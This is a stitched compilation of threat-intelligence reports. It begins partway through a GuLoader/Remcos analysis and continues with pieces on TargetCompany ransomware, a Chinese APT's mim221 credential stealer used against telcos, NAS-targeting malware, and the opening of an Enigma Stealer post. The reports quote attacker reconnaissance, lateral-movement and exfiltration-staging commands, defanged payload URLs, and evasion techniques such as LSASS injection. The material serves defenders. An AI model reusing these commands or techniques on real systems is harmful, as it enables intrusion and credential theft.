The cleaned-up PowerShell contains less than 30 lines of code and makes up the first stage of GuLoader’s PowerShell execution. 
To explain its functionality, we’ve formatted (including renaming some variables for readability) and organized the code into several sections. 
Section 1: Defines a payload URL (hxxp://194.55.224[.]183/frsh/Remimicra.hhp).Defines the path for the 32-bit PowerShell binary on 64-bit systems ($env:windir\syswow64\WindowsPowerShell\v1.0\powershell.exe).Gets the current process command line string using ((gwmi win32_process -F ProcessId=${PID}).CommandLine) -split
[char]34.Retrieves and stores second-to-last element from command line array from the last point.
Assigns a variable that checks if the system is 64-bit and if the 32-bit PowerShell exists in the syswow64 folder. 
Figure 5 First section of GuLoader's first stage PowerShell Section 2: 
If the system is 64-bit and the 32-bit PowerShell exists in the correct path, execute a new 32-bit PowerShell process copying the current process command line as a new argument.
This is likely done to reload PowerShell with the full command line argument but with a 32-bit process required for GuLoader’s shellcode.
Retrieve the next stage from the payload URL defined in Section 1 and save it to AppData\Fasta.ski using BitsTransfer. 
Figure 6 Section 2 of GuLoader's first stage PowerShell. 
Section 3: Reads the content of the payload file using the Get-Content cmdlet.
Base64 decodes the payload content.
Uses the GetString method of the System.
Text.
Encoding class to convert and encode a byte array to a string using ASCII encoding.
Extracts a 19712 characters length substring at index position 205484 then execute it.
This string contains the PowerShell to execute GuLoader’s shellcode. 
Figure 7 Section 3 of GuLoader's first stage PowerShell. 
The final section of the first stage PowerShell is where the code diverges from the variant observed in April.
Instead of writing more payloads to registry, a single payload package is retrieved that contains both the two-stage shellcode and additional PowerShell commands. 
The last section contains the second stage PowerShell code: Figure 8 CyberChef recipe to extract the second stage PowerShell from the payload package. 
Second Stage PowerShell 
The code contains non-human readable hex strings.
These strings are passed to a decoding function where they are converted from hex to byte and XOR’d with decimal 18.
The resulting byte array is converted to an ASCII string and returned by the function. 
To speed up analysis, a write-output cmdlet can be inserted into the function to print the decoded strings to the screen during runtime. 
Figure 9 Second stage PowerShell de-obfuscation routine. 
Once de-obfuscated, the purpose of the code is to reflectively load GuLoader’s shellcode in memory (the code overlaps heavily with this GitHub repo). 
Figure 10 PowerShell code to reflective load shellcode. 
As we saw in the previous variant in April, the code defines two buffers containing shellcode: Figure 11 Shellcode buffers. 
Shellcode A Copies the first 648 bytes containing shellcode from the payload package retrieved by the first stage PowerShell.
This shellcode is used to decode the second buffer using key 58 3E 88 D0. 
Figure 12 Key derived from Shellcode A. Shellcode B Copies 204836 bytes of shellcode from the same payload package beginning at offset 648.Once decoded, this shellcode is responsible for fetching Remcos RAT from hxxp://194.55.224[.]183/frsh/iFaeETTILhlw208.bin and injecting it into ieinstall.exe.
The Remcos RAT identified in this case communicates to zazuservr[.]com over port 9019. 
How did we find it? 
The activity was initially identified by eSentire MDR for Network via our global IP address blocklist.
Our team of 24/7 SOC Cyber Analysts traced the blocked network connections to endpoint telemetry that revealed the full extent of the activity described above. 
What did we do? 
Based on information from the initial investigation, we conducted additional threat hunts across all customers.
This information was used to update our detection content for GuLoader across our customers. 
What can you learn from this TRU positive? 
GuLoader is a highly evasive malware loader commonly used to deliver info-stealers and Remote Administration Tools (RATs).
GuLoader leverages user-initiated scripts or shortcut files to execute multiple rounds of highly obfuscated commands and encrypted shellcode.
The result is a memory-resident malware payload operating inside a legitimate Windows process.
Recent GuLoader campaigns employ a topical tax-themed lure as a way of enticing users to click on malicious shortcut files.
Tax documents are presented to the victim as a decoy while code is executed silently in parallel.
Remcos is a commercially available tool marketed as a legitimate Remote Administration Tool (RAT).
The tool provides various remote access and surveillance features including keylogging, screenshots and audio recording among other features which make the tool an attractive choice for threat actors.
Remcos is best paired with a capable malware loader such as GuLoader to ensure uninterrupted execution on systems where it has not explicitly been installed by administrators. 
Recommendations from our Threat Response Unit (TRU) Team: GuLoader is actively developed and highly evasive so having multiple layers of 24/7 threat detection and security event monitoring can compensate for gaps across telemetry sources.
Individuals and organizations should be vigilant when receiving unsolicited emails or messages related to taxes.
Train users to identify and report potentially malicious content using Phishing and Security Awareness Training (PSAT) programs.
Protect endpoints against malware by:Ensuring antivirus signatures are up-to-date.
Using a Next-Gen AV (NGAV) or Endpoint Detection and Response (EDR) tool to detect and contain threats. 
Indicators of Compromise Indicator Note f39329106b591529cc1d7e82f4cfbfa6 Tefor.vbs f6489874716c1684221548d18631e3a9 GuLoader Shellcode/PowerShell Combo Payload Package “Remimicra.hhp” hxxp://194.55.224[.]183/frsh/Remimicra.hhp GuLoader Shellcode/PowerShell Combo Payload Download hxxp://194.55.224[.]183/frsh/iFaeETTILhlw208.bin Hosting encrypted Remcos payload 905129eea82849764137f68e12efb2e7 Stage 1 shellcode eabf387e4dc5cff8e24030a09ffa7a7c Stage 2 shellcode, decrypted 1f8721109e05b5283d21a69e25293717 iFaeETTILhlw208.bin, encrypted Remcos payload. 
zazuservr[.]com Remcos C2 eSentire’s Threat Response Unit (TRU) is a world-class team of threat researchers who develop new detections enriched by original threat intelligence and leverage new machine learning models that correlate multi-signal data and automate rapid response to advanced threats. 
If you are not currently engaged with an MDR provider, eSentire MDR can help you reclaim the advantage and put your business ahead of disruption. 
Learn what it means to have an elite team of Threat Hunters and Researchers that works for you. 
Connect with an eSentire Security Specialist. 
title: Xollam, the Latest Face of TargetCompany url: https://www.trendmicro.com/en_us/research/23/f/xollam-the-latest-face-of-targetcompany.html Xollam, the Latest Face of TargetCompany This blog talks about the latest TargetCompany ransomware variant, Xollam, and the new initial access technique it uses.
We also investigate previous variants' behaviors and the ransomware family's extortion scheme. 
By: Earle Maui Earnshaw, Nathaniel Morales, Katherine Casona, Don Ovid Ladores June 06, 2023Read time: ( words) Save to Folio Subscribe After first being detected in June 2021, the TargetCompany ransomware family underwent several name changes that signified major updates in the ransomware family, such as modifications in encryption algorithm and different decryptor characteristics. 
The earliest samples of the TargetCompany ransomware appended victims’ files with the extension “.tohnichi,” the name of its victim enterprise at that time, signifying a targeted attack on the organization of the same name.
As a result, it was initially known as the Tohnichi ransomware. 
Later, the group continued appending encrypted files with names based on its victims, such as “.artis” for the Artis Zoo in Amsterdam.
Other extensions include “.herrco,” “.brg,” and “.carone.” Industry experts then later identified the ransomware as TargetCompany from the pattern it adopted of appending encrypted files after the company it was targeting. 
The variants Tohnichi (active in 2021), Mallox, and Fargo (both active in 2022) targeted vulnerabilities in Microsoft SQL (MS SQL) Server for initial access.
We elaborate on the behavior of these variants in our Ransomware Spotlight: TargetCompany. 
Figure 1.
The infection chain of the earlier TargetCompany variants Our investigations show that its latest variant, Xollam, now deviates from the gang’s tried-and-tested initial access method.
In this blog, we discuss this latest development in the TargetCompany ransomware’s behavior and look into its previous infection chains. 
Simultaneously active: Xollam and Mallox variants 
In 2023, Xollam was observed as following a technique similar to the one followed by phishing campaigns: using Microsoft OneNote files as initial access to spread and deliver malware.
This latest TargetCompany variant executed a spam campaign with malicious OneNote file attachments, a deviation from its roots of targeting vulnerable MS SQL databases. 
Based on our investigations, Xollam uses a pseudo-fileless technique through PowerShell, which executes reflective loading to download its payload. 
As we discuss in later sections, we have also observed this technique in earlier variants of the TargetCompany ransomware. 
Figure 2.
The attack flow of the latest TargetCompany variant, Xollam, which uses malicious OneNote files for initial access The latest variant of the ransomware, Xollam, was detected in February this year. 
In the same month, the older Mallox variant was also active, as it claimed the attack on the Federation of Indian Chambers of Commerce and Industry (FICCI).
The gang released 1.28 GB of compressed datasets that included financial balance sheets, employee reimbursement details, bank statements and internet banking credentials, industry audit reports, and documents related to FICCI subcommittees. 
Reflective loading, Mallox, and Fargo variants 
The Mallox variant of the ransomware was first detected in the wild in October 2021.
Later samples in January of the following year showed that the ransomware group started to employ reflective loading as part of its defense evasion. 
The Mallox variant connects to an IP address to load the encrypted ransomware, with its download URL only available for approximately 24 hours.
Notably, this made the dynamic analysis of old samples difficult. 
Our investigations revealed that the payload downloaded by the PowerShell script was a .NET downloader, which would subsequently retrieve an encrypted payload from the command-and-control (C&C) server. 
The downloaded file has a random file name and might have different extensions such as “.png,” “.bmp,” and “.jpg,” among others. 
Figure 3.
A closer look at the reflective loading technique that TargetCompany threat actors incorporated; the IP address it connects to changes every 24 hours and deploys different payloads The payload would then be decrypted through XOR or inversion and executed in memory.
The specific payload that is downloaded varies depending on the link on the .NET downloader. 
Figure 4.
Both Mallox and Fargo variants use a set of tools via remote desktop for defense evasion. 
It’s important to note that reflective loading enabled the Mallox variant to evade traditional antivirus solutions, making it challenging for organizations to protect themselves against these attacks. 
Meanwhile, the Remcos backdoor payload is executed via WmiPrvSE.exe, and the payload most likely arrives by exploiting public-facing websites and domains. 
Our investigations showed that the gang used different sets of defense evasion and reconnaissance tools such as GMER and Advance Process Termination to manually uninstall antivirus products on the target system.
We also observed the presence of YDArk.exe (PCHunter64) for performing rootkit behaviors, and that TargetCompany attempts to terminate security-related processes and services by dropping KILLAV. 
In addition, the ransomware drops a batch file named killer.bat that terminates various services and applications, including GPS-related services.
Afterward, it proceeds to steal system information like machine details and other relevant data. 
Figure 5.
TargetCompany ransomware defense evasion routine 
The ransomware encrypts the victim's files using the ChaCha20 encryption algorithm and generates the encryption keys using a combination of Curve25519, an example of elliptic curve cryptography, and AES-128. 
In June 2022, the gang targeted other victims with encrypted files appended with the extension “.fargo.”
We also observed that like Mallox, the Fargo variant employed reflective loading. 
In the last two months of 2022, there was an increase in attacks launched by the TargetCompany ransomware using its Mallox variant. 
Extortion While the Mallox and Fargo variants were operating simultaneously in 2022, TargetCompany initiated its double-extortion scheme by setting up a Telegram channel where it could publish stolen information. 
In August 2022, just two months after the group launched its Fargo variant, Mallox created a Twitter account where it could announce its victims.
Since this account was eventually suspended, the threat actors created a new one. Figure 6.
The first Twitter account (eventually suspended) that Mallox created for announcing its victims (top), and the new Twitter account that replaced it (bottom); the new account remains active as of this writing In November of the same year, Mallox launched its data leak site where, as of writing, it has declared only 20 victims.
However, our telemetry data revealed far more attacks at 269 attempts on Trend Micro customers from March 2022 to April 2023. 
In a January 2023 interview, threat actors behind TargetCompany said that they choose only a small percentage of their victims to publish on their leak site.
They also limit the amount of leaked data to what they deem particularly interesting and claim to have no intention of publishing everything. 
While the group said that it remains small and closed, the actors behind it mentioned that they are “open to suggestions.”
Interestingly, a new member of the cybercrime forum RAMP under the name “Mallx” was observed recruiting affiliates for the Mallox ransomware-as-a-service (RaaS) affiliate program. 
Our investigations also revealed that the ransomware might have connections with other groups such as the BlueSky ransomware, as well as the threat actors who perform brute-force attacks on MS SQL Servers.
TargetCompany shares similarities with these groups in terms of threat actor profiles, targets, deployed remote control, and encryption algorithm.
We discuss other possible affiliations, as well as victim profiles and behaviors in our Spotlight feature on the ransomware group. 
Conclusion The TargetCompany ransomware is making bolder ventures beyond its tried-and-tested techniques by joining the bandwagon of OneNote phishing campaigns, which allows it to cast a wider net for increased profitability.
Within just two years of activity, the threat actors behind the ransomware are proving their hunger for prolificacy, expanding their business model with a RaaS affiliate program and maintaining several platforms to announce victims and expose stolen data. 
We can expect TargetCompany to make even bigger moves in the future, especially since the threat actors behind it have admitted that they created TargetCompany to move away from the restrictions and inflexibility of their previous groups.
Now unhindered, the gang will naturally try to maximize profits from its victims. 
To protect systems from ransomware attacks, we recommend that both individual users and organizations implement best practices such as applying data protection and backup and recovery measures to secure data from possible encryption or erasure.
Conducting regular vulnerability assessments and patching systems in a timely manner can also minimize the damage dealt by ransomware families that abuse exploits. 
We advise users and organizations to update their systems with the latest patches and apply multilayered defense mechanisms.
End users and enterprises alike can mitigate the risk of infection from new threats like the TargetCompany ransomware by following these security best practices: Enable multifactor authentication (MFA) to prevent attackers from performing lateral movement inside a network. 
Adhere to the 3-2-1 rule when backing up important files.
This involves creating three backup copies on two different file formats, with one of the copies stored in a separate location. 
Patch and update systems regularly.
It’s important to keep operating systems and applications up to date and maintain patch management protocols that can deter malicious actors from exploiting any software vulnerabilities. 
Authors Earle Maui Earnshaw Threats Analyst Nathaniel Morales Threat Analyst Katherine Casona Threat Analyst Don Ovid Ladores Threats Analyst 
title: Operation Tainted Love | Chinese APTs Target Telcos in New Attacks url: https://www.sentinelone.com/labs/operation-tainted-love-chinese-apts-target-telcos-in-new-attacks/ By Aleksandar Milenkoski, Juan Andres Guerrero-Saade, and Joey Chen, in collaboration with QGroup Executive Summary In Q1 of 2023, SentinelLabs observed initial phases of attacks against telecommunication providers in the Middle East. 
We assess that this activity represents an evolution of tooling associated with Operation Soft Cell. 
While it is highly likely that the threat actor is a Chinese cyberespionage group in the nexus of Gallium and APT41, the exact grouping remains unclear. 
SentinelLabs observed the use of a well-maintained, versioned credential theft capability and a new dropper mechanism indicative of an ongoing development effort by a highly-motivated threat actor with specific tasking requirements. 
Overview 
In collaboration with QGroup GmbH, SentinelLabs recently observed initial threat activities targeting the telecommunication sector.
We assess it is highly likely that these attacks were conducted by a Chinese cyberespionage actor related to the Operation Soft Cell campaign. 
The initial attack phase involves infiltrating Internet-facing Microsoft Exchange servers to deploy webshells used for command execution.
Once a foothold is established, the attackers conduct a variety of reconnaissance, credential theft, lateral movement, and data exfiltration activities. 
The deployment of custom credential theft malware is central to this new campaign.
The malware implemented a series of Mimikatz modifications on closed-source tooling.
This post details the multi-component architecture and functionality of a sample, referred to as mim221. 
We assess that mim221 is a recent version of an actively maintained credential theft capability upgraded with new anti-detection features.
The use of special-purpose modules that implement a range of advanced techniques shows the threat actors’ dedication to advancing its toolset towards maximum stealth.
These techniques include in-memory mapping of malicious images to evade EDR API hooks and file-based detections surgically terminating Event Log threads instead of the host process to inhibit logging without raising suspicions staging a credential theft capability in the LSASS process itself by abusing native Windows capabilities. 
Version numbers and build timestamps indicate a maintained software project by designated developers.
Closer analysis reveals an element of pragmatism in that the threat actors use modified publicly available code to achieve their goals. 
In terms of attribution, the tooling suggests an immediate link to the ‘Operation Soft Cell’ campaign but remains slightly vague on the specific threat actor.
That campaign has been publicly associated with Gallium and possible connections to APT41 have been suggested by the use of a common code signing certificate and tooling that shares code similarities.
APT41 is also known to target telecommunication providers. 
Given previous target and TTP overlaps, and an evident familiarity with victim environments, we assess with medium-confidence that Gallium is involved.
However, we also recognize the possibility of closed-source tool-sharing between Chinese state-sponsored threat actors, and the possibility of a shared vendor or digital quartermaster. 
Regardless of clustering specifics, this finding highlights the increased operational tempo of Chinese cyberespionage actors and their consistent investment in advancing their malware arsenal to evade detection. 
Infection Vector and Initial TTPs As initial attack indicators, we observed command execution through webshells on compromised Microsoft Exchange server deployments.
The threat actors used C:\MS_DATA as their main working directory for storing malware and staging data for exfiltration.
Noting that the Microsoft TroubleShootingScript toolset (TSSv2) uses C:\MS_DATA for storing log files, we suspect that its use as a working directory is an attempt to make malicious file system activities look legitimate. 
After establishing an initial foothold, the threat actor conducts reconnaissance like querying user and network information using a variety of tools.
For example, the attackers used dsquery and query to obtain information about Active Directory objects, including user information, and Remote Desktop user sessions.
They also used the Local Group (LG) tool to enumerate all local groups and members in a domain. 
"cmd" /c cd /d C:\MS_DATA\&dsquery * -limit 0 -filter "cmd" /c cd /d
C:\MS_DATA\&dsquery * -limit 0 -filter "&(objectClass=User)(objectCategory=Person)"
-attr objectSID sAMAccountName displayName mail memberOf >da.back&cd "cmd" /c cd /d c:\windows\system32\inetsrv\&query user&cd "cmd" /c cd /d
C:\MS_DATA\&lg.exe \\[IP ADDRESS] -lu >
169.txt&cd 
The attackers then check connectivity with both the Internet and specific local machines of interest. 
"cmd" /c cd /d
c:\windows\system32\inetsrv\&ping 8.8.8.8 -n 1&cd "cmd" /c cd /d
c:\windows\system32\inetsrv\&ping -n
1
[IP ADDRESS/HOSTNAME]&cd They also retrieve networking information, like network adapters, specific machines, and network services like Remote Desktop Protocol (RDP). 
"cmd" /c cd /d C:\MS_DATA\&ipconfig
/all&cd "cmd" /c cd /d
c:\windows\system32\inetsrv\&net use&cd "cmd" /c cd /d
c:\windows\system32\inetsrv\&netstat.exe -nob "cmd" /c cd /d c:\windows\system32\inetsrv\&netstat -aon |find "3389"&cd "cmd" /c cd /d C:\MS_DATA\&netstat -aon |find "[IP ADDRESS]"&cd 
The threat actor made use of the native makecab tool to compress information gathered for exfiltration. 
"cmd" /c cd /d C:\MS_DATA\&makecab da.back d.zip >1.txt&cd For lateral movement, the attackers made use of the PsExec tool and the net use command for accessing shared resources on remote machines. 
C:\MS_DATA\&net use \\[IP ADDRESS]
[PASSWORD] /u:[DOMAIN]\[USERNAME] A Penchant for Credential Theft 
In order to steal credentials, the attackers employ custom modified versions of Mimikatz, including an executable named pc.exe. 
Mimikatz publicly available code (top); strings from a Mimikatz modification (bottom)The pc.exe executable stages the execution of three other components that ultimately result in stealing credentials from the Local Security Authority Subsystem Service (LSASS) process. 
We refer to the four component chain as ‘mim221’ based on the version number that the tool displays (2.2.1). 
We observed the threat actors deploying individual chunks of pc.exe in the working directory and merging these into pc.exe using the type command. 
pc.exe file chunksWe noticed that the attackers ceased their activities after stealing credentials.
This could indicate a multi-phase attack strategy, where the deployment of backdoors and further persistence mechanisms is carried out separately after credential theft has ensured continued access.
The intrusions were detected and interrupted before the attackers could carry out further phases, such as deploying backdoors. 
mim221 The architecture of mim221 consists of four components: the pc.exe Windows executable, and the AddSecurityPackage64.dll, pc.dll, and getHashFlsa64.dll DLLs contained therein. 
mim221 execution overviewmim221 Component Size Compilation timestamp pc.exe 502 KBs Thu Jun 09 08:02:12 2022 (UTC) AddSecurityPackage64.dll 119 KB Thu Jun 09 08:01:46 2022 (UTC) pc.dll 297 KB Tue Jun 07 16:55:05 2022 (UTC) getHashFlsa64.dll 216 KB Fri May 27 20:56:26 2022 (UTC) pc.exe The main binary executed by the threat actor is pc.exe.
It decrypts AddSecurityPackage64.dll and pc.dll, stores pc.dll on the file system, and then loads and executes AddSecurityPackage64.dll by invoking its exported function, pathAddPackage. 
The execution of pc.exe requires a password supplied by the operator (in this case, P2sSW0rd1234!@#$C), which the operator provides through the key command-line parameter. 
pc.exe decrypts AddSecurityPackage64.dll and pc.dll using the AES encryption algorithm, providing the operator-provided execution password as an initialization vector. 
pc.exe loads and executes the decrypted AddSecurityPackage64.dllusing reflective image loading.
This technique involves first mapping a Windows PE image in memory and then executing the image’s main entry point or an export function. 
Among other activities, the image mapping process includes allocating memory for the image, storing the image headers and sections in the memory, populating the images’ import and delay import tables, adding exception handlers, and executing TLS callback and export routines.
The Phant0m tool provides a complete implementation of this process. 
While reflective image loading is a known technique at this time, its use was first observed in the DoublePulsar and subsequently the SlingShot frameworks in 2017 and 2018, respectively.
This technique enables the fully fileless loading and execution of a malicious image without invoking the standard Windows API, such as LoadLibrary.
This eliminates detection based on API hooking and file artifacts. 
When it is finished executing, pc.exe displays a message indicating a version number and build timestamp: Version 2.2.1 - build on Jun 9 2022 16:02:12. 
AddSecurityPackage64.dll AddSecurityPackage64.dll, which is the original filename of this mim221 component, is responsible for: Obtaining the SeDebugPrivilege and SYSTEM privilege by access token impersonation.
This allows mim221 to inspect and extract credentials from the LSASS process. 
Disabling Windows event logging in an attempt to evade detection; and Injecting pc.dll into LSASS as a Security Package.
Security Packages are used to extend the Windows authentication mechanism and can be abused to execute malicious code in the context of LSASS. 
In an attempt to remain undetected, AddSecurityPackage64.dll disables Windows event logging by killing threads of the Windows Event Log service without stopping the execution of the service itself.
This is achieved by locating the process that hosts the Event Log, enumerating the processes’ threads, identifying the threads assigned to the service by their service tag (eventlog), and terminating them. 
Querying service tag informationAddSecurityPackage64.dll injects pc.dll into LSASS by deploying pc.dll as a Security Package.
To this end, AddSecurityPackage64.dll issues an RPC call to LSASS – to the ncalrpc:[lsasspirpc] RPC endpoint, providing the file path to pc.dll to LSASS.
This call instructs LSASS to load and execute pc.dll, which then stages the getHashFlsa64.dll credential theft component. 
getHashFlsa64.dll conducts credential theft in the context of LSASSpc.dll and getHashFlsa64.dll In the context LSASS, pc.dll decrypts, reflectively loads, and executes the code credential theft component getHashFlsa64.dll in a manner similar to pc.exe.
pc.dll and getHashFlsa64.dll share the same original filename: getHashFlsa64.dll. 
pc.dll is implemented such that its main routine returns FALSE, making LSASS execute pc.dll and then unload it.
This is a detection evasion technique making LSASS load pc.dll while avoiding appearing as an added (registered) Security Package.
LSASS normally creates registry entries when adding Security Packages and does not unload them once loaded.
This provides an opportunity for defenders to detect the loading of malicious Security Packages.
Previous research provides more detail on this topic. 
getHashFlsa64.dll accesses the memory of its host LSASS process and stores stolen credentials in a Mimikatz log file named pc.log for later exfiltration. 
Example pc.log contentgetHashFlsa64.dll exports a function named GetMyVersion, which displays a version number and build timestamp (Version 2.2.0 - build on May 28 2022 04:56:23), in a format consistent with the output from pc.exe.
The credential theft functionality of getHashFlsa64.dll is implemented in its export function GetLogonInfo. 
The GetMyVersion functionAdditional Information Error Messages and Public Code Reuse The mim221 components implement error logging.
The error messages follow a consistent output format. 
Example error messagesIt is important to note that we observed code segments that seem to be modified versions of publicly available code.
For example, the implementation of AddSecurityPackage64.dll looks like an adaptation of public code that demonstrates injection of a Security Package into LSASS using RPC calls. 
Similarity between publicly available code (top) and AddSecurityPackage64.dll (bottom)Timestamp Information The mim221 components that reflectively load other executables, pc.exe and pc.dll, patch beforehand a string in the loaded executable, which provides further timestamp information: ====A!B@C#0-2022-05-23 16:33:03S. The patching involves replacing the string with configuration information, such as the mim221 execution password and a path to the log file for storing stolen credentials. 
Patched timestamp stringAttribution Analysis We assess it is highly likely the initial attack phases we observed were conducted by Chinese threat actors with cyberespionage motivations.
Telecommunication providers are frequent targets of espionage activity due to the sensitive data they hold.
Our analysis identified indicators that point to the operation Soft Cell actors. 
Operation Soft Cell has been associated with the Gallium group based on TTPs and some of the domains the group has been using. 
Active since at least 2012, Gallium is likely a Chinese state-sponsored group that is targeting telecommunication, financial, and government entities in Southeast Asia, Europe, Africa, and the Middle East.
While the group’s original focus has been on telecommunication providers, recent reports suggest that Gallium has recently expanded targeting across other sectors. 
The initial intrusion vector and the majority of the TTPs we observed closely match those conducted by, or associated with, the Soft Cell actors.
This includes deploying webshells at Microsoft Exchange servers for establishing an initial foothold, following same file naming conventions, using the LG tool and the net, query, and tasklist Windows built-in tools for gathering user and process information, and the PsExec Windows Sysinternals tool and net for lateral movement and exploration, respectively. 
It is worth noting that the attackers’ activities at one of the targets suggested previous knowledge of the environment.
We had observed activity at the same target a few months prior, which we attributed to Gallium primarily based on the use of the group’s PingPull backdoor and TTPs. 
By pivoting on the original filename of mim221’s getHashFlsa64.dll, we observed another sample that steals credentials from LSASS.
This sample has the PDB path of e:\vs_proj\mimkTools\getHashFlsa\getHashFlsa\x64\release\getHashFlsa64.pdb and has been first submitted to VirusTotal from Vietnam on January 04, 2023. 
The path partially overlaps with the PDB path of a Mimikatz Soft Cell executable (E:\vs_proj\simplify_modify\Win32\simplify.pdb) and another Mimikatz executable of a Chinese threat actor thought to be part of the Soft Cell activity group arsenal (E:\vs_proj\mimkTools\dcsync_new\x64\dcsync64.pdb).
This indicates that mim221 and these binaries may originate from the same source. 
Closer analysis confirms that the sample we pivoted to is a previous, less-advanced version of mim221 – Version 2.2.0 – that does not include some mim221 components, such as AddSecurityPackage64.dll and pc.dll.
We refer to this sample as mim220. 
Output from mim220 (top) and mim221 (bottom) 
Previous research indicates possible connections between the Soft Cell actors and APT41, which is known to conduct Chinese state-sponsored espionage activity as well as financially motivated activity targeting multiple sectors with a broad geographical coverage, including telecommunication providers. 
The connection between the Soft Cell actors and APT41 that most relates to the activities that we observed is based on the Whizzimo, LLC certificate of the Soft Cell binary with a PDB path E:\vs_proj\simplify_modify\Win32\simplify.pdb, a binary that possibly originates from the same source as mim221.
This certificate has been reported to be used by APT41.
Pivoting on this certificate reveals further Mimikatz modifications, some with filenames very similar to those we observed. 
Conclusions Chinese cyberespionage threat actors are known to have a strategic interest in the Middle East.
This is evident from their consistent targeted attacks on various entities including government, finance, entertainment, and telecommunication organizations.
The recent activities targeting the telecommunication sector this post discusses are some of the latest such attacks. 
Our analysis of mim221 highlights the continuous maintenance and further development of the Chinese espionage malware arsenal.
These threat actors will almost certainly continue exploring and upgrading their tools with new techniques for evading detection, including integrating and modifying publicly available code. 
SentinelLabs continues to monitor espionage activities and hopes that defenders will leverage the findings presented in this post to bolster their defenses. 
Indicators of Compromise SHA1 Note f54a41145b732d47d4a2b0a1c6e811ddcba48558 pc.exe 1c405ba0dd99d9333173a8b44a98c6d029db8178 AddSecurityPackage64.dll (unpatched) df4bd177b40dd66f3efb8d6ea39459648ffd5c0e AddSecurityPackage64.dll (patched) 814f980877649bc67107d9e27e36fba677cad4e3 pc.dll 508408edda49359247edc7008762079c5ba725d9 getHashFlsa64.dll (unpatched) 97a7f1a36294e5525310f121e1b98e364a22e64d getHashFlsa64.dll (patched) 
title: Defending Users’ NAS Devices From Evolving Threats url: https://www.trendmicro.com/en_us/research/22/a/defending-users-NAS-devices-from-evolving-threats.html Defending Users’ NAS Devices From Evolving Threats In our latest research, we analyze the threats targeting well-known brands of network-attached storage (NAS) devices. 
By: Stephen Hilt, Fernando Merces January 20, 2022Read time: ( words) Save to Folio Subscribe Threats to the internet of things (IoT) continue to evolve as users and businesses grow increasingly reliant on these tools for constant connectivity, access to information and data, and workflow continuity.
Cybercriminals have taken notice of this dependence and now regularly update their known tools and routines to include network-attached storage (NAS) devices to their list of targets, knowing full well that users rely on these devices for storing and backing up files in both modern homes and businesses.
More importantly, cybercriminals are aware that these tools hold valuable information and have only minimal security measures. 
In our latest research paper, “Backing Your Backup: Defending NAS Devices Against Evolving Threats,” we studied the current infrastructure, environment, threats, and recommendations for defending systems against current threats targeting NAS devices.
To emphasize the importance of mitigating the risks of malware infection and targeted attacks on NAS devices, we analyzed the technical details of two malware families that potentially included NAS devices in their existing business models, the REvil ransomware and StealthWorker botnets. 
REvil 
While the disappearance of REvil (aka Sodinokibi) in mid-2021 is filled with uncertainty, security researchers have found a Linux version of the REvil ransomware that they have dubbed as Revix.
After analyzing the samples, we found four different versions of the malware, all of which rely on an embedded JavaScript Observed Notation (JSON)-based configuration to set parameters before encrypting files. 
Figure 1.
Revix’s JSON-based configuration While some parameters are ignored by the ransomware, these are most important ones that we observed: pk: A 64-byte key nbody: The ransomware note text-encoded in base64 nname: The ransomware note name ext: The extension added to encrypted files After compromising the system, the malicious actors execute it manually on a NAS device to encrypt files and create a ransom note with a unique key per victim. 
Figure 2.
Revix encrypting a QNAP NAS device Figure 3.
Revix ransom note While the differences between the versions are minor, the group advertised the capability of encrypting NAS devices as early as May 2021 in underground forums.
Given the vulnerability of NAS devices that are directly connected to the internet, we can expect a new wave of ransomware attacks affecting these gadgets in the future. 
StealthWorker In 2021, security researchers found brute-force attacks launched from the StealthWorker botnet on Synology NAS devices.
We found multiple samples for this botnet and confirmed that newer versions are capable of brute-forcing and compromising servers running on several products and systems such as WooCommerce and WordPress.
This botnet is also designed to generally attack any web server using HTTP authentication and other NAS devices like QNAP.
Valid credentials found during compromise are then uploaded to the command-and-control (C&C) server, usually at port 5028/TCP. Figure 4.
StealthWorker brute-force function targeting QNAP devices Figure 5.
Infected Linux device connected to a C&C server How to protect NAS devices Without proper security implemented in NAS devices, users and businesses will continue to be targeted since these tools can be used as entry points for information theft, malware infection, and the disruption of operations, among others.
Here are some best practices to protect your systems against threats that leverage the gaps in your NAS devices: Avoid connecting a NAS device directly to the internet. 
Regularly change the credentials for accessing an NAS device.
Never use the preset default credentials that come with the device as these are well-known to malicious actors. 
Enable two-factor authentication (2FA) for additional security. 
Regularly check NAS manufacturers’ online security guides, such as Synology’s recommended best practices and QNAP’s recently released suggestions on how to help defend their devices against additional exposure on the internet. 
To find more technical details, threats, insights, and recommendations in protecting your NAS device, download our research “Backing Your Backup: Defending NAS Devices Against Evolving Threats.” Authors Stephen Hilt Sr. Threat Researcher Fernando Merces Sr. Threat Researcher 
title: Enigma Stealer Targets Cryptocurrency Industry with Fake Jobs url: https://www.trendmicro.com/en_us/research/23/b/enigma-stealer-targets-cryptocurrency-industry-with-fake-jobs.html Malware Enigma Stealer Targets Cryptocurrency Industry with Fake Jobs We discovered an active campaign targeting Eastern Europeans in the cryptocurrency industry using fake job lures. 
By: Aliakbar Zahravi, Peter Girnus February 09, 2023Read time: ( words) Save to Folio Subscribe We recently found an active campaign that uses a fake employment pretext targeting Eastern Europeans in the cryptocurrency industry to install an information stealer.
In this campaign, the suspected Russian threat actors, use several highly obfuscated and underdevelopment custom loaders in order to infect those involved in the cryptocurrency industry with Enigma stealer (detected as TrojanSpy.MSIL.ENGIMASTEALER.YXDBC), which is a modified version of the Stealerium information stealer.
In addition to these loaders, the attacker also exploits CVE-2015-2291, an Intel driver vulnerability, to load a malicious driver designed to reduce the token integrity of Microsoft Defender. 
Stealerium, the original information stealer which serves as the base for Enigma Stealer, is an open-source project written in C# and markets itself as a stealer, clipper, and keylogger with logging capabilities using the Telegram API.
Security teams and individual users are advised to continuously update the security solutions of their systems and remain vigilant against threat actors who perform social engineering via job opportunity or salary increase-related lures. 
Attack Chain Figure 1.
The Attack kill chain used by Enigma Stealer operator (click the image for a larger version) Using fake cryptocurrency interviews to lure victims 
The infection chain starts with a malicious RAR archive — in this instance, contract.rar (SHA256: 658725fb5e75ebbcb03bc46d44f048a0f145367eff66c8a1a9dc84eef777a9cc) — which is distributed to victims via phishing attempts or through social media.
The archive contains the files, Interview questions.txt, and Interview conditions.word.exe. 
Figure 2.
The files found inside the malicious RAR archive These files set up the pretext for a fake cryptocurrency role or job opening.
One file, Interview questions.txt (SHA256: 3a1eb6fabf45d18869de4ffd773ae82949ef80f89105e5f96505de810653ed73) contains sample interview questions written in Cyrillic.
This serves to further legitimize the package in the eyes of the victim and draw attention away from the malicious binary. Figure 3.
A machine translation of Interview questions.txt The other file Interview conditions.word.exe (SHA256: 03b9d7296b01e8f3fb3d12c4d80fe8a1bb0ab2fd76f33c5ce11b40729b75fb23) contains the first stage Enigma loader.
